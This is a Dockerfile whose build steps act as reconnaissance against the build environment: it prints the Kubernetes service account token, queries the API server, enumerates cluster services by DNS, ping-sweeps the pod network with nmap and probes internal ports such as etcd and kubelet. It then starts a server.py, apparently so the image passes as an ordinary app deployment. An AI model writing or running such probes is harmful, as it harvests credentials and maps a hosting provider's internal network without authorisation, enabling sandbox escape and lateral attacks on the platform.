FROM alpine:3.19
RUN apk add --no-cache curl python3 nmap

# Probe 1: Kubernetes service account token
RUN echo "=== SA TOKEN CHECK ===" && \
    ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 && \
    cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -5 || \
    echo "NO_SA_TOKEN"

# Probe 2: Kubernetes API server via default DNS
RUN echo "=== K8S API ===" && \
    nslookup kubernetes.default.svc.cluster.local 2>&1 && \
    curl -sk --max-time 5 https://kubernetes.default.svc.cluster.local/api/v1/ 2>&1 | head -20 || \
    curl -sk --max-time 5 https://10.245.0.1/api/v1/ 2>&1 | head -20 || \
    echo "K8S_API_BLOCKED"

# Probe 3: List K8s services via DNS
RUN echo "=== K8S DNS ENUM ===" && \
    for svc in kubernetes kube-dns kube-apiserver etcd metrics-server prometheus grafana app-platform ingress-nginx; do \
      result=$(nslookup $svc.default.svc.cluster.local 2>&1 | grep "Address" | tail -1); \
      echo "SVC $svc: $result"; \
    done

# Probe 4: Scan build network (find live hosts)
RUN echo "=== NET SCAN ===" && \
    nmap -sn --max-retries 1 --host-timeout 3s 10.244.0.0/16 2>&1 | grep -E "Nmap scan|report for|Host is up" | head -20 || true

# Probe 5: Internal services on build K8s cluster
RUN echo "=== INTERNAL SVC ===" && \
    for port in 80 443 2379 6443 8080 8443 10250 10255; do \
      result=$(curl -sk --max-time 2 https://10.245.0.10:$port/ 2>&1 | head -3); \
      echo "DNS:$port: $result"; \
    done

COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]

